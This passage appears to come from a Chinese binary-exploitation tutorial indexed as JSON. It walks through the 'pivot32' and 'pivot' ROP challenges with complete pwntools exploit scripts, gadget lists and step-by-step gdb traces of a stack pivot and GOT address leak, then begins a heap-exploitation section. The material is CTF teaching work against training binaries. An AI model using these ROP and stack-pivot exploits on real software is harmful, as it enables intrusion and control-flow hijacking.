\u6307\u4ee4\u7684\u5730\u5740\uff0c\u8fd9\u6837\u7a0b\u5e8f\u5728\u6267\u884c\u5b8c\u5176\u539f\u672c\u7684 leave;ret \u540e\uff0c\u53c8\u6267\u884c\u4e86\u4e00\u6b21 leave;ret\u3002 \u53e6\u5916 fake ebp \u6307\u5411\u6211\u4eec\u53e6\u4e00\u6bb5 payload\uff08\u8fd9\u91cc\u79f0\u4e3a\u4e3bpayload\uff09 \u7684 ebp\uff0c\u5373 \u4e3bpayload \u5730\u5740\u51cf 4 \u7684\u5730\u65b9\uff0c\u5f53\u7136\u4f60\u4e5f\u53ef\u4ee5\u5728\u6784\u9020 \u4e3bpayload \u65f6\u5728\u524d\u9762\u52a0 4 \u4e2a\u5b57\u8282\u7684 padding \u4f5c\u4e3a ebp\uff1a ebp | payload \u6211\u4eec\u77e5\u9053\u4e00\u4e2a\u51fd\u6570\u7684\u5165\u53e3\u70b9\u901a\u5e38\u662f\uff1a push ebp mov ebp,esp leave \u6307\u4ee4\u76f8\u5f53\u4e8e\uff1a mov esp,ebp pop ebp ret \u6307\u4ee4\u4e3a\u76f8\u5f53\u4e8e\uff1a pop eip \u5982\u679c\u9047\u5230\u4e00\u79cd\u60c5\u51b5\uff0c\u6211\u4eec\u53ef\u4ee5\u63a7\u5236\u7684\u6808\u6ea2\u51fa\u7684\u5b57\u8282\u6570\u6bd4\u8f83\u5c0f\uff0c\u4e0d\u80fd\u5b8c\u6210\u5168\u90e8\u7684\u5de5\u4f5c\uff0c\u540c\u65f6\u7a0b\u5e8f\u5f00\u542f\u4e86 PIE \u6216\u8005\u7cfb\u7edf\u5f00\u542f\u4e86 ASLR\uff0c\u4f46\u540c\u65f6\u5728\u7a0b\u5e8f\u7684\u53e6\u4e00\u4e2a\u5730\u65b9\u6709\u8db3\u591f\u7684\u7a7a\u95f4\u53ef\u4ee5\u5199\u5165 payload\uff0c\u5e76\u4e14\u53ef\u6267\u884c\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u5c06\u6808\u8f6c\u79fb\u5230\u90a3\u4e2a\u5730\u65b9\u53bb\u3002 \u5b8c\u6574\u7684 exp \u5982\u4e0b\uff1a from pwn import * #context.log_level = 'debug' #context.terminal = ['konsole'] io = process('./pivot32') elf = ELF('./pivot32') libp = ELF('./libpivot32.so') leave_ret = 0x0804889f foothold_plt = elf.plt['foothold_function'] # 0x080485f0 foothold_got_plt = elf.got['foothold_function'] # 0x0804a024 pop_eax = 0x080488c0 pop_ebx = 0x08048571 mov_eax_eax = 0x080488c4 add_eax_ebx = 0x080488c7 call_eax = 0x080486a3 foothold_sym = libp.symbols['foothold_function'] ret2win_sym = libp.symbols['ret2win'] offset = int(ret2win_sym - foothold_sym) # 0x1f7 leakaddr = int(io.recv().split()[20], 16) # calls foothold_function() to populate its GOT entry, then queries that value into EAX #gdb.attach(io) payload_1 = p32(foothold_plt) payload_1 += p32(pop_eax) payload_1 += p32(foothold_got_plt) payload_1 += p32(mov_eax_eax) payload_1 += p32(pop_ebx) payload_1 += p32(offset) payload_1 += p32(add_eax_ebx) payload_1 += p32(call_eax) io.sendline(payload_1) # ebp = leakaddr-4, esp = leave_ret payload_2 = \"A\"*40 payload_2 += p32(leakaddr-4) + p32(leave_ret) io.sendline(payload_2) print io.recvall() \u8fd9\u91cc\u6211\u4eec\u5728 gdb \u4e2d\u9a8c\u8bc1\u4e00\u4e0b\uff0c\u5728 pwnme() \u51fd\u6570\u7684 leave \u5904\u4e0b\u65ad\u70b9\uff1a gdb-peda$ b *0x0804889f Breakpoint 1 at 0x804889f gdb-peda$ c Continuing. [----------------------------------registers-----------------------------------] EAX: 0xffe7ec40 ('A' <repeats 40 times>, \"\\f\\317U\\367\\237\\210\\004\\b\\n\") EBX: 0x0 ECX: 0xffe7ec40 ('A' <repeats 40 times>, \"\\f\\317U\\367\\237\\210\\004\\b\\n\") EDX: 0xf7731860 --> 0x0 ESI: 0xf772fe28 --> 0x1d1d30 EDI: 0x0 EBP: 0xffe7ec68 --> 0xf755cf0c --> 0x0 ESP: 0xffe7ec40 ('A' <repeats 40 times>, \"\\f\\317U\\367\\237\\210\\004\\b\\n\") EIP: 0x804889f (<pwnme+173>: leave) EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow) [-------------------------------------code-------------------------------------] 0x8048896 <pwnme+164>: call 0x80485b0 <fgets@plt> 0x804889b <pwnme+169>: add esp,0x10 0x804889e <pwnme+172>: nop => 0x804889f <pwnme+173>: leave 0x80488a0 <pwnme+174>: ret 0x80488a1 <uselessFunction>: push ebp 0x80488a2 <uselessFunction+1>: mov ebp,esp 0x80488a4 <uselessFunction+3>: sub esp,0x8 [------------------------------------stack-------------------------------------] 0000| 0xffe7ec40 ('A' <repeats 40 times>, \"\\f\\317U\\367\\237\\210\\004\\b\\n\") 0004| 0xffe7ec44 ('A' <repeats 36 times>, \"\\f\\317U\\367\\237\\210\\004\\b\\n\") 0008| 0xffe7ec48 ('A' <repeats 32 times>, \"\\f\\317U\\367\\237\\210\\004\\b\\n\") 0012| 0xffe7ec4c ('A' <repeats 28 times>, \"\\f\\317U\\367\\237\\210\\004\\b\\n\") 0016| 0xffe7ec50 ('A' <repeats 24 times>, \"\\f\\317U\\367\\237\\210\\004\\b\\n\") 0020| 0xffe7ec54 ('A' <repeats 20 times>, \"\\f\\317U\\367\\237\\210\\004\\b\\n\") 0024| 0xffe7ec58 ('A' <repeats 16 times>, \"\\f\\317U\\367\\237\\210\\004\\b\\n\") 0028| 0xffe7ec5c ('A' <repeats 12 times>, \"\\f\\317U\\367\\237\\210\\004\\b\\n\") [------------------------------------------------------------------------------] Legend: code, data, rodata, value Breakpoint 1, 0x0804889f in pwnme () gdb-peda$ x/10w 0xffe7ec68 0xffe7ec68: 0xf755cf0c 0x0804889f 0xf755000a 0x00000000 0xffe7ec78: 0x00000002 0x00000000 0x00000001 0xffe7ed44 0xffe7ec88: 0xf755cf10 0xf655d010 gdb-peda$ x/10w 0xf755cf0c 0xf755cf0c: 0x00000000 0x080485f0 0x080488c0 0x0804a024 0xf755cf1c: 0x080488c4 0x08048571 0x000001f7 0x080488c7 0xf755cf2c: 0x080486a3 0x0000000a \u6267\u884c\u7b2c\u4e00\u6b21 leave;ret \u4e4b\u524d\uff0c\u6211\u4eec\u770b\u5230 EBP \u6307\u5411 fake ebp\uff0c\u5373 0xf755cf0c \uff0cfake ebp \u6307\u5411 \u4e3bpayload \u7684 ebp\uff0c\u800c\u5728 fake ebp \u540e\u9762\u662f leave;ret \u7684\u5730\u5740 0x0804889f \uff0c\u5373\u8fd4\u56de\u5730\u5740\u3002 \u6267\u884c\u7b2c\u4e00\u6b21 leave\uff1a gdb-peda$ n [----------------------------------registers-----------------------------------] EAX: 0xffe7ec40 ('A' <repeats 40 times>, \"\\f\\317U\\367\\237\\210\\004\\b\\n\") EBX: 0x0 ECX: 0xffe7ec40 ('A' <repeats 40 times>, \"\\f\\317U\\367\\237\\210\\004\\b\\n\") EDX: 0xf7731860 --> 0x0 ESI: 0xf772fe28 --> 0x1d1d30 EDI: 0x0 EBP: 0xf755cf0c --> 0x0 ESP: 0xffe7ec6c --> 0x804889f (<pwnme+173>: leave) EIP: 0x80488a0 (<pwnme+174>: ret) EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow) [-------------------------------------code-------------------------------------] 0x804889b <pwnme+169>: add esp,0x10 0x804889e <pwnme+172>: nop 0x804889f <pwnme+173>: leave => 0x80488a0 <pwnme+174>: ret 0x80488a1 <uselessFunction>: push ebp 0x80488a2 <uselessFunction+1>: mov ebp,esp 0x80488a4 <uselessFunction+3>: sub esp,0x8 0x80488a7 <uselessFunction+6>: call 0x80485f0 <foothold_function@plt> [------------------------------------stack-------------------------------------] 0000| 0xffe7ec6c --> 0x804889f (<pwnme+173>: leave) 0004| 0xffe7ec70 --> 0xf755000a --> 0x0 0008| 0xffe7ec74 --> 0x0 0012| 0xffe7ec78 --> 0x2 0016| 0xffe7ec7c --> 0x0 0020| 0xffe7ec80 --> 0x1 0024| 0xffe7ec84 --> 0xffe7ed44 --> 0xffe808cf (\"./pivot32\") 0028| 0xffe7ec88 --> 0xf755cf10 --> 0x80485f0 (<foothold_function@plt>: jmp DWORD PTR ds:0x804a024) [------------------------------------------------------------------------------] Legend: code, data, rodata, value 0x080488a0 in pwnme () EBP \u7684\u503c 0xffe7ec68 \u88ab\u8d4b\u503c\u7ed9 ESP\uff0c\u7136\u540e\u4ece\u6808\u4e2d\u5f39\u51fa 0xf755cf0c \uff0c\u5373 fake ebp \u5e76\u8d4b\u503c\u7ed9 EBP\uff0c\u540c\u65f6 ESP+4= 0xffe7ec6c \uff0c\u6307\u5411\u7b2c\u4e8c\u6b21\u7684 leave\u3002 \u6267\u884c\u7b2c\u4e00\u6b21 ret\uff1a gdb-peda$ n [----------------------------------registers-----------------------------------] EAX: 0xffe7ec40 ('A' <repeats 40 times>, \"\\f\\317U\\367\\237\\210\\004\\b\\n\") EBX: 0x0 ECX: 0xffe7ec40 ('A' <repeats 40 times>, \"\\f\\317U\\367\\237\\210\\004\\b\\n\") EDX: 0xf7731860 --> 0x0 ESI: 0xf772fe28 --> 0x1d1d30 EDI: 0x0 EBP: 0xf755cf0c --> 0x0 ESP: 0xffe7ec70 --> 0xf755000a --> 0x0 EIP: 0x804889f (<pwnme+173>: leave) EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow) [-------------------------------------code-------------------------------------] 0x8048896 <pwnme+164>: call 0x80485b0 <fgets@plt> 0x804889b <pwnme+169>: add esp,0x10 0x804889e <pwnme+172>: nop => 0x804889f <pwnme+173>: leave 0x80488a0 <pwnme+174>: ret 0x80488a1 <uselessFunction>: push ebp 0x80488a2 <uselessFunction+1>: mov ebp,esp 0x80488a4 <uselessFunction+3>: sub esp,0x8 [------------------------------------stack-------------------------------------] 0000| 0xffe7ec70 --> 0xf755000a --> 0x0 0004| 0xffe7ec74 --> 0x0 0008| 0xffe7ec78 --> 0x2 0012| 0xffe7ec7c --> 0x0 0016| 0xffe7ec80 --> 0x1 0020| 0xffe7ec84 --> 0xffe7ed44 --> 0xffe808cf (\"./pivot32\") 0024| 0xffe7ec88 --> 0xf755cf10 --> 0x80485f0 (<foothold_function@plt>: jmp DWORD PTR ds:0x804a024) 0028| 0xffe7ec8c --> 0xf655d010 --> 0x0 [------------------------------------------------------------------------------] Legend: code, data, rodata, value Breakpoint 1, 0x0804889f in pwnme () EIP= 0x804889f \uff0c\u540c\u65f6 ESP+4\u3002 \u7b2c\u4e8c\u6b21 leave\uff1a gdb-peda$ n [----------------------------------registers-----------------------------------] EAX: 0xffe7ec40 ('A' <repeats 40 times>, \"\\f\\317U\\367\\237\\210\\004\\b\\n\") EBX: 0x0 ECX: 0xffe7ec40 ('A' <repeats 40 times>, \"\\f\\317U\\367\\237\\210\\004\\b\\n\") EDX: 0xf7731860 --> 0x0 ESI: 0xf772fe28 --> 0x1d1d30 EDI: 0x0 EBP: 0x0 ESP: 0xf755cf10 --> 0x80485f0 (<foothold_function@plt>: jmp DWORD PTR ds:0x804a024) EIP: 0x80488a0 (<pwnme+174>: ret) EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow) [-------------------------------------code-------------------------------------] 0x804889b <pwnme+169>: add esp,0x10 0x804889e <pwnme+172>: nop 0x804889f <pwnme+173>: leave => 0x80488a0 <pwnme+174>: ret 0x80488a1 <uselessFunction>: push ebp 0x80488a2 <uselessFunction+1>: mov ebp,esp 0x80488a4 <uselessFunction+3>: sub esp,0x8 0x80488a7 <uselessFunction+6>: call 0x80485f0 <foothold_function@plt> [------------------------------------stack-------------------------------------] 0000| 0xf755cf10 --> 0x80485f0 (<foothold_function@plt>: jmp DWORD PTR ds:0x804a024) 0004| 0xf755cf14 --> 0x80488c0 (<usefulGadgets>: pop eax) 0008| 0xf755cf18 --> 0x804a024 --> 0x80485f6 (<foothold_function@plt+6>: push 0x30) 0012| 0xf755cf1c --> 0x80488c4 (<usefulGadgets+4>: mov eax,DWORD PTR [eax]) 0016| 0xf755cf20 --> 0x8048571 (<_init+33>: pop ebx) 0020| 0xf755cf24 --> 0x1f7 0024| 0xf755cf28 --> 0x80488c7 (<usefulGadgets+7>: add eax,ebx) 0028| 0xf755cf2c --> 0x80486a3 (<deregister_tm_clones+35>: call eax) [------------------------------------------------------------------------------] Legend: code, data, rodata, value 0x080488a0 in pwnme () gdb-peda$ x/10w 0xf755cf10 0xf755cf10: 0x080485f0 0x080488c0 0x0804a024 0x080488c4 0xf755cf20: 0x08048571 0x000001f7 0x080488c7 0x080486a3 0xf755cf30: 0x0000000a 0x00000000 EBP \u7684\u503c 0xf755cf0c \u88ab\u8d4b\u503c\u7ed9 ESP\uff0c\u5e76\u5c06 \u4e3bpayload \u7684 ebp \u8d4b\u503c\u7ed9 EBP\uff0c\u540c\u65f6 ESP+4= 0xf755cf10 \uff0c\u8fd9\u4e2a\u503c\u6b63\u662f\u6211\u4eec \u4e3bpayload \u7684\u5730\u5740\u3002 \u7b2c\u4e8c\u6b21 ret\uff1a gdb-peda$ n [----------------------------------registers-----------------------------------] EAX: 0xffe7ec40 ('A' <repeats 40 times>, \"\\f\\317U\\367\\237\\210\\004\\b\\n\") EBX: 0x0 ECX: 0xffe7ec40 ('A' <repeats 40 times>, \"\\f\\317U\\367\\237\\210\\004\\b\\n\") EDX: 0xf7731860 --> 0x0 ESI: 0xf772fe28 --> 0x1d1d30 EDI: 0x0 EBP: 0x0 ESP: 0xf755cf14 --> 0x80488c0 (<usefulGadgets>: pop eax) EIP: 0x80485f0 (<foothold_function@plt>: jmp DWORD PTR ds:0x804a024) EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow) [-------------------------------------code-------------------------------------] 0x80485e0 <exit@plt>: jmp DWORD PTR ds:0x804a020 0x80485e6 <exit@plt+6>: push 0x28 0x80485eb <exit@plt+11>: jmp 0x8048580 => 0x80485f0 <foothold_function@plt>: jmp DWORD PTR ds:0x804a024 | 0x80485f6 <foothold_function@plt+6>: push 0x30 | 0x80485fb <foothold_function@plt+11>: jmp 0x8048580 | 0x8048600 <__libc_start_main@plt>: jmp DWORD PTR ds:0x804a028 | 0x8048606 <__libc_start_main@plt+6>: push 0x38 |-> 0x80485f6 <foothold_function@plt+6>: push 0x30 0x80485fb <foothold_function@plt+11>: jmp 0x8048580 0x8048600 <__libc_start_main@plt>: jmp DWORD PTR ds:0x804a028 0x8048606 <__libc_start_main@plt+6>: push 0x38 JUMP is taken [------------------------------------stack-------------------------------------] 0000| 0xf755cf14 --> 0x80488c0 (<usefulGadgets>: pop eax) 0004| 0xf755cf18 --> 0x804a024 --> 0x80485f6 (<foothold_function@plt+6>: push 0x30) 0008| 0xf755cf1c --> 0x80488c4 (<usefulGadgets+4>: mov eax,DWORD PTR [eax]) 0012| 0xf755cf20 --> 0x8048571 (<_init+33>: pop ebx) 0016| 0xf755cf24 --> 0x1f7 0020| 0xf755cf28 --> 0x80488c7 (<usefulGadgets+7>: add eax,ebx) 0024| 0xf755cf2c --> 0x80486a3 (<deregister_tm_clones+35>: call eax) 0028| 0xf755cf30 --> 0xa ('\\n') [------------------------------------------------------------------------------] Legend: code, data, rodata, value 0x080485f0 in foothold_function@plt () \u6210\u529f\u8df3\u8f6c\u5230 foothold_function@plt \uff0c\u63a5\u4e0b\u6765\u7cfb\u7edf\u901a\u8fc7 _dl_runtime_resolve \u7b49\u6b65\u9aa4\uff0c\u5c06\u771f\u6b63\u7684\u5730\u5740\u5199\u5165\u5230 .got.plt \u4e2d\uff0c\u6211\u4eec\u6784\u9020 gadget \u6cc4\u9732\u51fa\u8be5\u5730\u5740\u5730\u5740\uff0c\u7136\u540e\u8ba1\u7b97\u51fa ret2win() \u7684\u5730\u5740\uff0c\u8c03\u7528\u5b83\uff0c\u5c31\u6210\u529f\u4e86\u3002 \u5730\u5740\u6cc4\u9732\u7684\u8fc7\u7a0b\uff1a gdb-peda$ n [----------------------------------registers-----------------------------------] EAX: 0x54 ('T') EBX: 0x0 ECX: 0x54 ('T') EDX: 0xf7731854 --> 0x0 ESI: 0xf772fe28 --> 0x1d1d30 EDI: 0x0 EBP: 0x0 ESP: 0xf755cf18 --> 0x804a024 --> 0xf7772770 (<foothold_function>: push ebp) EIP: 0x80488c0 (<usefulGadgets>: pop eax) EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow) [-------------------------------------code-------------------------------------] 0x80488ba: xchg ax,ax 0x80488bc: xchg ax,ax 0x80488be: xchg ax,ax => 0x80488c0 <usefulGadgets>: pop eax 0x80488c1 <usefulGadgets+1>: ret 0x80488c2 <usefulGadgets+2>: xchg esp,eax 0x80488c3 <usefulGadgets+3>: ret 0x80488c4 <usefulGadgets+4>: mov eax,DWORD PTR [eax] [------------------------------------stack-------------------------------------] 0000| 0xf755cf18 --> 0x804a024 --> 0xf7772770 (<foothold_function>: push ebp) 0004| 0xf755cf1c --> 0x80488c4 (<usefulGadgets+4>: mov eax,DWORD PTR [eax]) 0008| 0xf755cf20 --> 0x8048571 (<_init+33>: pop ebx) 0012| 0xf755cf24 --> 0x1f7 0016| 0xf755cf28 --> 0x80488c7 (<usefulGadgets+7>: add eax,ebx) 0020| 0xf755cf2c --> 0x80486a3 (<deregister_tm_clones+35>: call eax) 0024| 0xf755cf30 --> 0xa ('\\n') 0028| 0xf755cf34 --> 0x0 [------------------------------------------------------------------------------] Legend: code, data, rodata, value 0x080488c0 in usefulGadgets () gdb-peda$ n [----------------------------------registers-----------------------------------] EAX: 0x804a024 --> 0xf7772770 (<foothold_function>: push ebp) EBX: 0x0 ECX: 0x54 ('T') EDX: 0xf7731854 --> 0x0 ESI: 0xf772fe28 --> 0x1d1d30 EDI: 0x0 EBP: 0x0 ESP: 0xf755cf1c --> 0x80488c4 (<usefulGadgets+4>: mov eax,DWORD PTR [eax]) EIP: 0x80488c1 (<usefulGadgets+1>: ret) EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow) [-------------------------------------code-------------------------------------] 0x80488bc: xchg ax,ax 0x80488be: xchg ax,ax 0x80488c0 <usefulGadgets>: pop eax => 0x80488c1 <usefulGadgets+1>: ret 0x80488c2 <usefulGadgets+2>: xchg esp,eax 0x80488c3 <usefulGadgets+3>: ret 0x80488c4 <usefulGadgets+4>: mov eax,DWORD PTR [eax] 0x80488c6 <usefulGadgets+6>: ret [------------------------------------stack-------------------------------------] 0000| 0xf755cf1c --> 0x80488c4 (<usefulGadgets+4>: mov eax,DWORD PTR [eax]) 0004| 0xf755cf20 --> 0x8048571 (<_init+33>: pop ebx) 0008| 0xf755cf24 --> 0x1f7 0012| 0xf755cf28 --> 0x80488c7 (<usefulGadgets+7>: add eax,ebx) 0016| 0xf755cf2c --> 0x80486a3 (<deregister_tm_clones+35>: call eax) 0020| 0xf755cf30 --> 0xa ('\\n') 0024| 0xf755cf34 --> 0x0 0028| 0xf755cf38 --> 0x0 [------------------------------------------------------------------------------] Legend: code, data, rodata, value 0x080488c1 in usefulGadgets () gdb-peda$ n [----------------------------------registers-----------------------------------] EAX: 0x804a024 --> 0xf7772770 (<foothold_function>: push ebp) EBX: 0x0 ECX: 0x54 ('T') EDX: 0xf7731854 --> 0x0 ESI: 0xf772fe28 --> 0x1d1d30 EDI: 0x0 EBP: 0x0 ESP: 0xf755cf20 --> 0x8048571 (<_init+33>: pop ebx) EIP: 0x80488c4 (<usefulGadgets+4>: mov eax,DWORD PTR [eax]) EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow) [-------------------------------------code-------------------------------------] 0x80488c1 <usefulGadgets+1>: ret 0x80488c2 <usefulGadgets+2>: xchg esp,eax 0x80488c3 <usefulGadgets+3>: ret => 0x80488c4 <usefulGadgets+4>: mov eax,DWORD PTR [eax] 0x80488c6 <usefulGadgets+6>: ret 0x80488c7 <usefulGadgets+7>: add eax,ebx 0x80488c9 <usefulGadgets+9>: ret 0x80488ca <usefulGadgets+10>: xchg ax,ax [------------------------------------stack-------------------------------------] 0000| 0xf755cf20 --> 0x8048571 (<_init+33>: pop ebx) 0004| 0xf755cf24 --> 0x1f7 0008| 0xf755cf28 --> 0x80488c7 (<usefulGadgets+7>: add eax,ebx) 0012| 0xf755cf2c --> 0x80486a3 (<deregister_tm_clones+35>: call eax) 0016| 0xf755cf30 --> 0xa ('\\n') 0020| 0xf755cf34 --> 0x0 0024| 0xf755cf38 --> 0x0 0028| 0xf755cf3c --> 0x0 [------------------------------------------------------------------------------] Legend: code, data, rodata, value 0x080488c4 in usefulGadgets () gdb-peda$ n [----------------------------------registers-----------------------------------] EAX: 0xf7772770 (<foothold_function>: push ebp) EBX: 0x0 ECX: 0x54 ('T') EDX: 0xf7731854 --> 0x0 ESI: 0xf772fe28 --> 0x1d1d30 EDI: 0x0 EBP: 0x0 ESP: 0xf755cf20 --> 0x8048571 (<_init+33>: pop ebx) EIP: 0x80488c6 (<usefulGadgets+6>: ret) EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow) [-------------------------------------code-------------------------------------] 0x80488c2 <usefulGadgets+2>: xchg esp,eax 0x80488c3 <usefulGadgets+3>: ret 0x80488c4 <usefulGadgets+4>: mov eax,DWORD PTR [eax] => 0x80488c6 <usefulGadgets+6>: ret 0x80488c7 <usefulGadgets+7>: add eax,ebx 0x80488c9 <usefulGadgets+9>: ret 0x80488ca <usefulGadgets+10>: xchg ax,ax 0x80488cc <usefulGadgets+12>: xchg ax,ax [------------------------------------stack-------------------------------------] 0000| 0xf755cf20 --> 0x8048571 (<_init+33>: pop ebx) 0004| 0xf755cf24 --> 0x1f7 0008| 0xf755cf28 --> 0x80488c7 (<usefulGadgets+7>: add eax,ebx) 0012| 0xf755cf2c --> 0x80486a3 (<deregister_tm_clones+35>: call eax) 0016| 0xf755cf30 --> 0xa ('\\n') 0020| 0xf755cf34 --> 0x0 0024| 0xf755cf38 --> 0x0 0028| 0xf755cf3c --> 0x0 [------------------------------------------------------------------------------] Legend: code, data, rodata, value 0x080488c6 in usefulGadgets ()","title":"pivot32"},{"location":"Tutorial/Material/Binary%20Exploitation/#pivot","text":"\u57fa\u672c\u540c\u4e0a\uff0c\u4f46\u4f60\u53ef\u4ee5\u5c1d\u8bd5\u628a\u4fee\u6539 rsp \u7684\u90e8\u5206\u4e5f\u7528 gadgets \u6765\u5b9e\u73b0\uff0c\u8fd9\u6837\u505a\u7684\u597d\u5904\u662f\u6211\u4eec\u4e0d\u9700\u8981\u4f2a\u9020\u4e00\u4e2a\u5806\u6808\uff0c\u5373\u4e0d\u7528\u7ba1 ebp \u7684\u5730\u5740\u3002\u5982\uff1a payload_2 = \"A\" * 40 payload_2 += p64(pop_rax) payload_2 += p64(leakaddr) payload_2 += p64(xchg_rax_rsp) \u5b9e\u9645\u4e0a\uff0c\u6211\u672c\u4eba\u6b63\u662f\u4f7f\u7528\u8fd9\u79cd\u65b9\u6cd5\uff0c\u56e0\u4e3a\u6211\u5728\u6784\u5efa payload \u65f6\uff0c 0x0000000000400ae0 <+165>: leave \uff0cleave;ret \u7684\u5730\u5740\u5b58\u5728\u622a\u65ad\u5b57\u7b26 0a \uff0c\u8fd9\u6837\u5c31\u4e0d\u80fd\u901a\u8fc7\u6b63\u5e38\u7684\u65b9\u5f0f\u5199\u5165\u7f13\u51b2\u533a\uff0c\u5f53\u7136\u8fd9\u4e5f\u662f\u53ef\u4ee5\u89e3\u51b3\u7684\uff0c\u6bd4\u5982\u5148\u5c06 0a \u6362\u6210\u975e\u622a\u65ad\u5b57\u7b26\uff0c\u4e4b\u540e\u518d\u4f7f\u7528\u5bc4\u5b58\u5668\u5c06 0a \u5199\u5165\u8be5\u5730\u5740\uff0c\u8fd9\u4e5f\u662f\u901a\u5e38\u89e3\u51b3\u7f13\u51b2\u533a\u4e2d\u622a\u65ad\u5b57\u7b26\u7684\u65b9\u6cd5\uff0c\u4f46\u662f\u8fd9\u6837\u505a\u96be\u5ea6\u592a\u5927\uff0c\u4e0d\u63a8\u8350\uff0c\u611f\u5174\u8da3\u7684\u8bfb\u8005\u53ef\u4ee5\u5c1d\u8bd5\u4e00\u4e0b\u3002 $ ropgadget --binary pivot --only \"mov|pop|call|add|xchg|ret\" 0x0000000000400b09 : add rax, rbp ; ret 0x000000000040098e : call rax 0x0000000000400b05 : mov rax, qword ptr [rax] ; ret 0x0000000000400b00 : pop rax ; ret 0x0000000000400900 : pop rbp ; ret 0x0000000000400b02 : xchg rax, rsp ; ret from pwn import * #context.log_level = 'debug' #context.terminal = ['konsole'] io = process('./pivot') elf = ELF('./pivot') libp = ELF('./libpivot.so') leave_ret = 0x0000000000400adf foothold_plt = elf.plt['foothold_function'] # 0x400850 foothold_got_plt = elf.got['foothold_function'] # 0x602048 pop_rax = 0x0000000000400b00 pop_rbp = 0x0000000000400900 mov_rax_rax = 0x0000000000400b05 xchg_rax_rsp = 0x0000000000400b02 add_rax_rbp = 0x0000000000400b09 call_rax = 0x000000000040098e foothold_sym = libp.symbols['foothold_function'] ret2win_sym = libp.symbols['ret2win'] offset = int(ret2win_sym - foothold_sym) # 0x14e leakaddr = int(io.recv().split()[20], 16) # calls foothold_function() to populate its GOT entry, then queries that value into EAX #gdb.attach(io) payload_1 = p64(foothold_plt) payload_1 += p64(pop_rax) payload_1 += p64(foothold_got_plt) payload_1 += p64(mov_rax_rax) payload_1 += p64(pop_rbp) payload_1 += p64(offset) payload_1 += p64(add_rax_rbp) payload_1 += p64(call_rax) io.sendline(payload_1) # rsp = leakaddr payload_2 = \"A\" * 40 payload_2 += p64(pop_rax) payload_2 += p64(leakaddr) payload_2 += p64(xchg_rax_rsp) io.sendline(payload_2) print io.recvall() \u8fd9\u6837\u57fa\u672c\u7684 ROP \u4e5f\u5c31\u4ecb\u7ecd\u5b8c\u4e86\uff0c\u66f4\u9ad8\u7ea7\u7684\u7528\u6cd5\u4f1a\u5728\u540e\u9762\u7684\u7ae0\u8282\u4e2d\u518d\u4ecb\u7ecd\uff0c\u6240\u8c13\u7684\u9ad8\u7ea7\uff0c\u4e5f\u5c31\u662f gadgets \u6784\u9020\u66f4\u52a0\u5de7\u5999\uff0c\u8fd0\u7528\u64cd\u4f5c\u7cfb\u7edf\u7684\u77e5\u8bc6\u66f4\u52a0\u5e95\u5c42\u800c\u5df2\u3002","title":"pivot"},{"location":"Tutorial/Material/Binary%20Exploitation/#316-linux","text":"Linux \u5806\u7b80\u4ecb how2heap first_fit fastbin_dup fastbin_dup_into_stack fastbin_dup_consolidate unsafe_unlink house_of_spirit \u53c2\u8003\u8d44\u6599","title":"3.1.6 Linux \u5806\u5229\u7528\uff08\u4e0a\uff09"},{"location":"Tutorial/Material/Binary%20Exploitation/#linux","text":"\u5806\u662f\u7a0b\u5e8f\u865a\u62df\u5730\u5740\u7a7a\u95f4\u4e2d\u7684\u4e00\u5757\u8fde\u7eed\u7684\u533a\u57df\uff0c\u7531\u4f4e\u5730\u5740\u5411\u9ad8\u5730\u5740\u589e\u957f\u3002\u5f53\u524d Linux \u4f7f\u7528\u7684\u5806\u5206\u914d\u5668\u88ab\u79f0\u4e3a ptmalloc2\uff0c\u5728 glibc \u4e2d\u5b9e\u73b0\u3002 \u66f4\u8be6\u7ec6\u7684\u6211\u4eec\u5df2\u7ecf\u5728\u7ae0\u8282 1.5.8 \u4e2d\u4ecb\u7ecd\u4e86\uff0c\u7ae0\u8282 1.5.7 \u4e2d\u4e5f\u6709\u76f8\u5173\u5185\u5bb9\uff0c\u8bf7\u56de\u987e\u4e00\u4e0b\u3002 \u5bf9\u5806\u5229\u7528\u6765\u8bf4\uff0c\u4e0d\u7528\u4e8e\u6808\u4e0a\u7684\u6ea2\u51fa\u80fd\u591f\u76f4\u63a5\u8986\u76d6\u51fd\u6570\u7684\u8fd4\u56de\u5730\u5740\u4ece\u800c\u63a7\u5236 EIP\uff0c\u53ea\u80fd\u901a\u8fc7\u95f4\u63a5\u624b\u6bb5\u6765\u52ab\u6301\u7a0b\u5e8f\u63a7\u5236\u6d41\u3002","title":"Linux \u5806\u7b80\u4ecb"},{"location":"Tutorial/Material/Binary%20Exploitation/#how2heap","text":"how2heap \u662f\u7531 shellphish \u56e2\u961f\u5236\u4f5c\u7684\u5806\u5229\u7528\u6559\u7a0b\uff0c\u4ecb\u7ecd\u4e86\u591a\u79cd\u5806\u5229\u7528\u6280\u672f\uff0c\u8fd9\u7bc7\u6587\u7ae0\u6211\u4eec\u5c31\u901a\u8fc7\u8fd9\u4e2a\u6559\u7a0b\u6765\u5b66\u4e60\u3002\u63a8\u8350\u4f7f\u7528 Ubuntu 16.04 64\u4f4d\u7cfb\u7edf\u73af\u5883\uff0cglibc \u7248\u672c\u5982\u4e0b\uff1a $ file /lib/x86_64-linux-gnu/libc-2.23.so /lib/x86_64-linux-gnu/libc-2.23.so: ELF 64-bit LSB shared object, x86-64, version 1 (GNU/Linux), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=088a6e00a1814622219f346b41e775b8dd46c518, for GNU/Linux 2.6.32, stripped $ git clone https://github.com/shellphish/how2heap.git $ cd how2heap $ make 